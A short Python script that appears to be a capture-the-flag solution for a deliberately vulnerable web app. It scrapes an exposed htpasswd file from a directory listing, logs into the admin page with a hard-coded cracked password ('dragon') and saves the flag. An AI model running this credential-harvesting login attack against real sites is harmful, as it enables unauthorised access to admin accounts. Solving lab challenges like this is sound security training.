import requests
from bs4 import BeautifulSoup
import sys
import json


def get_login_passwd(host_name):
    for link in BeautifulSoup(requests.get(url='http://'+host_name+'/whatever/').text, 'html.parser').find_all('a'):
        if link.get('href') == 'htpasswd':
            content = requests.get(url='http://'+host_name+'/whatever/'+'/'+link.get('href')).content.decode('utf-8')
            username, passwd = content.strip().split(':')
            return username, passwd


def get_flag(host_name, username, passwd):
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64…) Gecko/20100101 Firefox/67.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {'username': username, 'password': passwd, 'Login': 'Login'}

    session = requests.Session()
    session.get('http://{host}/'.format(host=host_name), data=json.dumps(headers))
    response = session.post('http://{host}/admin/'.format(host=host_name), data=data)

    with open('../flag', 'w') as f:
        flag = BeautifulSoup(response.text, 'html.parser').find('h2').text.split(':')[-1].strip()
        f.write(flag+'\n')

    return flag


def check_host_name(host_name):
    return requests.get('http://'+host_name+'/whatever/').status_code == 200


if __name__ == '__main__':
    try:
        host_name = sys.argv[1]

        if check_host_name(host_name):
            username, passwd = get_login_passwd(host_name)
            # print('username: {}\npassword: {}'.format(username, passwd))
            print(f"11 : {get_flag(host_name, username, 'dragon')} - htpasswd admin http://{host_name}/whatever/")
        else:
            raise Exception('Incorrect host name')
    except Exception as e:
        print(e.args)
